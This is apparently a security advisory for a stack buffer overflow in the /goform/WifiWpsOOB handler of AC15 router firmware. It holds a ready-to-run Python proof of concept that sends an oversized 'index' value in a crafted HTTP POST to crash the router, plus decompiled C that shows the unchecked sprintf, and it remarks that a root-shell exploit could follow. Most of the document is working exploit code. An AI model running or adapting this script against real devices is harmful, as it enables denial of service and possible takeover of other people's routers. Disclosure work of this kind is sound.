# WifiWpsOOB

### Affected product

```
AC15V15.03.05.19
```

### POC

```python
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x60
p2 = b'wifi_chkHz=1&index=' + p1

p3 = b"POST /goform/WifiWpsOOB" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)

```

/goform/WifiWpsOOB，index  is controllable and will eventually be spliced into dest by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability

### Detail

```c
  nptr = (char *)sub_9E1DC(a1, "index", 0);
  v1 = (const char *)sub_2BA8C(a1, (int)"wifi_chkHz", (int)"0");
  if ( atoi(v1) )
    v2 = 5;
  else
    v2 = 24;
  v11 = v2;
  v3 = atoi(nptr);
  printf("%s %d: index = %d, wl_rate = %d####\n", "formWifiWpsOOB", 4130, v3, v11);
  if ( nptr )
  {
    if ( v11 == 5 )
    {
      SetValue("wl.bcm11ac", &byte_EEEF8);
      GetValue((int)"wl5g.public.enable", (int)v8);
    }
    else
    {
      SetValue("wl.bcm11ac", "0");
      GetValue((int)"wl2g.public.enable", (int)v8);
    }
    v5 = atoi(nptr);
    if ( sub_9B748(v11, v5) )
    {
      sprintf(s, "%s;%s", nptr, "0");
      result = sub_9CB14(a1, s);
    }
```

You can see the router crash, and finally we can write an exp to get a root shell

